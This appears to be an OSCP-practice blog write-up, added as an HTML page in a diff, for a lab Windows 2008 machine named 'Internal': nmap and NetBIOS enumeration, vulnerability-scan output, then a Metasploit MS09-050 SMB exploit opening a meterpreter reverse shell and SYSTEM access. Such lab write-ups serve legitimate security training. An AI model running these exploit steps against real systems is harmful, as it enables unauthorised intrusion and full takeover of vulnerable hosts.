@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Internal :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Enumeration NMAP ┌──(kali㉿kali)-[~/Documents/OSCPprep/internal] └─$ nmap 192.168.193.40 -Pn -oN nmapALL.txt -p- Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 03:25 EDT Nmap scan report for 192.168.193.40 Host is up (0.049s latency). Not shown: 65522 closed tcp ports (conn-refused) PORT STATE SERVICE 53/tcp open domain 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 5357/tcp open wsdapi 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown UDP PORT STATE SERVICE 53/udp open domain 137/udp open netbios-ns 138/udp open|filtered netbios-dgm 500/udp open|filtered isakmp 3702/udp open|filtered ws-discovery 4500/udp open|filtered nat-t-ike 5355/udp open|filtered llmnr Netbios Netbios displays current concurrent I/O operations" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/oscp/internal/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Internal :: Research blog">
+<meta property="og:description" content="Another eZ CVE straight to `SYSTEM`. Looks to be a few vulns for foothold/ pwnage" />
+<meta property="og:url" content="https://thomas-byrne.co.uk/oscp/internal/" />
+<meta property="og:site_name" content="Internal" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-10 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/oscp/internal/">Internal</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-10 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Internal" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="nmap">NMAP<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/internal<span style="color:#f92672">]</span>
+└─$ nmap 192.168.193.40 -Pn -oN nmapALL.txt -p-
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-06-26 03:25 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.193.40
+Host is up <span style="color:#f92672">(</span>0.049s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65522</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+PORT      STATE SERVICE
+53/tcp    open  domain
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5357/tcp  open  wsdapi
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+
+</code></pre></div><h3 id="udp">UDP<a href="#udp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT     STATE         SERVICE
+53/udp   open          domain
+137/udp  open          netbios-ns
+138/udp  open|filtered netbios-dgm
+500/udp  open|filtered isakmp
+3702/udp open|filtered ws-discovery
+4500/udp open|filtered nat-t-ike
+5355/udp open|filtered llmnr
+</code></pre></div><h2 id="netbios">Netbios<a href="#netbios" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Netbios displays current concurrent I/O operations</p>
+<ul>
+<li>port 137 UDP</li>
+</ul>
+<p>NetBIOS is a service which allows communication between applications such as a printer or other computer in Ethernet or token ring network via NetBIOS name</p>
+<p><strong>Workgroup:</strong> It is a peer-to-peer network for a maximum of 10 computers in the same LAN or subnet. It has no Centralized Administration, which means no computer has control over another computer. Each user controls the resources and security locally on their system.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/internal<span style="color:#f92672">]</span>
+└─$ nbtscan 192.168.193.40
+Doing NBT name scan <span style="color:#66d9ef">for</span> addresses from 192.168.193.40
+
+IP address       NetBIOS Name     Server    User             MAC address      
+------------------------------------------------------------------------------
+192.168.193.40   INTERNAL         &lt;server&gt;  &lt;unknown&gt;        00:50:56:ba:e9:bc
+
+</code></pre></div><h2 id="version-enumeration">Version enumeration<a href="#version-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+</code></pre></div><h3 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Taking a look for any known exploits with these service versions shows a potential code execution exploit in SMB</p>
+<p><a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-050">https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-050</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/internal<span style="color:#f92672">]</span>     
+└─$ nmap --script<span style="color:#f92672">=</span>vuln 192.168.193.40                                          
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-06-26 05:00 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.193.40                 
+Host is up <span style="color:#f92672">(</span>0.020s latency<span style="color:#f92672">)</span>.                                                                             
+Not shown: <span style="color:#ae81ff">987</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>      
+PORT      STATE SERVICE                             
+53/tcp    open  domain                              
+135/tcp   open  msrpc                                                                                    
+139/tcp   open  netbios-ssn 
+445/tcp   open  microsoft-ds                        
+3389/tcp  open  ms-wbt-server    
+|_ssl-ccs-injection: No reply from server <span style="color:#f92672">(</span>TIMEOUT<span style="color:#f92672">)</span> 
+| rdp-vuln-ms12-020:                                                                                     
+|   VULNERABLE:                                                                                          
+|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
+|     State: VULNERABLE                             
+|     IDs:  CVE:CVE-2012-0152                      
+|     Risk factor: Medium  CVSSv2: 4.3 <span style="color:#f92672">(</span>MEDIUM<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>AV:N/AC:M/Au:N/C:N/I:N/A:P<span style="color:#f92672">)</span>
+|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
+|                                                   
+|     Disclosure date: 2012-03-13              
+|     References:                                   
+|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2012-0152
+|                                                   
+|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
+|     State: VULNERABLE                             
+|     IDs:  CVE:CVE-2012-0002
+|     Risk factor: High  CVSSv2: 9.3 <span style="color:#f92672">(</span>HIGH<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>AV:N/AC:M/Au:N/C:C/I:C/A:C<span style="color:#f92672">)</span>
+|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
+|                                                   
+|     Disclosure date: 2012-03-13
+|     References:                                   
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2012-0002
+|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
+5357/tcp  open  wsdapi                              
+49152/tcp open  unknown                             
+49153/tcp open  unknown                             
+49154/tcp open  unknown                             
+49155/tcp open  unknown                             
+49156/tcp open  unknown                             
+49157/tcp open  unknown                             
+49158/tcp open  unknown
+host script results:                                
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010:                                
+|   VULNERABLE:                                     
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>
+|     State: VULNERABLE                             
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH                             
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>.
+|                                                   
+|     Disclosure date: 2017-03-14
+|     References:                                   
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2017-0143
+|_smb-vuln-ms10-054: false
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+Host script results:
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
+| smb-vuln-cve2009-3103: 
+|   VULNERABLE:
+|   SMBv2 exploit <span style="color:#f92672">(</span>CVE-2009-3103, Microsoft Security Advisory 975497<span style="color:#f92672">)</span>
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2009-3103
+|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
+|           Windows Server <span style="color:#ae81ff">2008</span> Gold and SP2, and Windows <span style="color:#ae81ff">7</span> RC allows remote attackers to execute arbitrary code or cause a
+|           denial of service <span style="color:#f92672">(</span>system crash<span style="color:#f92672">)</span> via an &amp; <span style="color:#f92672">(</span>ampersand<span style="color:#f92672">)</span> character in a Process ID High header field in a NEGOTIATE
+|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
+|           aka <span style="color:#e6db74">&#34;SMBv2 Negotiation Vulnerability.&#34;</span>
+
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 75.89 seconds
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/OSCPprep/internal<span style="color:#f92672">]</span>
+└─$ searchsploit ms09-050                                                                                       
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                  |  Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Microsoft Windows - <span style="color:#e6db74">&#39;srv2.sys&#39;</span> SMB Code Execution <span style="color:#f92672">(</span>Python<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>MS09-050<span style="color:#f92672">)</span>                                                                                                           | windows/remote/40280.py
+Microsoft Windows - <span style="color:#e6db74">&#39;srv2.sys&#39;</span> SMB Negotiate ProcessID Function Table Dereference <span style="color:#f92672">(</span>MS09-050<span style="color:#f92672">)</span>                                                                                    | windows/remote/14674.txt
+Microsoft Windows - <span style="color:#e6db74">&#39;srv2.sys&#39;</span> SMB Negotiate ProcessID Function Table Dereference <span style="color:#f92672">(</span>MS09-050<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                                                       | windows/remote/16363.rb
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                        
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; search MS09-050                                                                                   
+                                                    
+Matching Modules                                                                                         
+<span style="color:#f92672">================</span>                                    
+                                                                                                         
+   <span style="color:#75715e">#  Name                                                       Disclosure Date  Rank    Check  Description                                                                                                      </span>
+   -  ----                                                       ---------------  ----    -----  -----------                                                                                                      
+   <span style="color:#ae81ff">0</span>  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference                                   
+   <span style="color:#ae81ff">1</span>  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                   normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference                                            
+   <span style="color:#ae81ff">2</span>  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                      normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
+                                                    
+                                                    
+Interact with a module by name or index. For example info 2, use <span style="color:#ae81ff">2</span> or use auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                                                                                  
+                                                                                                         
+msf6 &gt; use <span style="color:#ae81ff">0</span>                            
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp                                 
+msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms09_050_smb2_negotiate_func_index<span style="color:#f92672">)</span> &gt;
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>windows/smb/ms09_050_smb2_negotiate_func_index<span style="color:#f92672">)</span> &gt; run
+                                                    
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.49.193:4444 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.193.40:445 - Connecting to the target <span style="color:#f92672">(</span>192.168.193.40:445<span style="color:#f92672">)</span>...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.193.40:445 - Sending the exploit packet <span style="color:#f92672">(</span><span style="color:#ae81ff">951</span> bytes<span style="color:#f92672">)</span>...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.193.40:445 - Waiting up to <span style="color:#ae81ff">180</span> seconds <span style="color:#66d9ef">for</span> exploit to trigger...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 192.168.193.40
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.49.193:4444 -&gt; 192.168.193.40:49159<span style="color:#f92672">)</span> at 2022-06-26 04:57:44 -0400
+                                                    
+meterpreter &gt; sysinfo                               
+Computer        : INTERNAL
+OS              : Windows <span style="color:#ae81ff">2008</span> <span style="color:#f92672">(</span>6.0 Build 6001, Service Pack 1<span style="color:#f92672">)</span>.
+Architecture    : x86                   
+System Language : en_US                  
+Domain          : WORKGROUP                                                                              
+Logged On Users : <span style="color:#ae81ff">3</span>                          
+Meterpreter     : x86/windows                       
+meterpreter &gt; shell                                 
+Process <span style="color:#ae81ff">2480</span> created.                               
+Channel <span style="color:#ae81ff">1</span> created.       
+Microsoft Windows <span style="color:#f92672">[</span>Version 6.0.6001<span style="color:#f92672">]</span>                                                                     
+Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2006</span> Microsoft Corporation.  All rights reserved.                                          
+                                                    
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+whoami                                    
+nt authority<span style="color:#ae81ff">\s</span>ystem
+
+</code></pre></div><p>Looks like there&rsquo;s a few exploits that might work. I also tried a different exploit script which returned a reverse shell but it wasnt stable. I tried passing it some shellcode that would execute a command to download a payload from my webserver and get a shell that way but it never connected back. Exploit was a bit unstable and kept crashing the system.</p>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
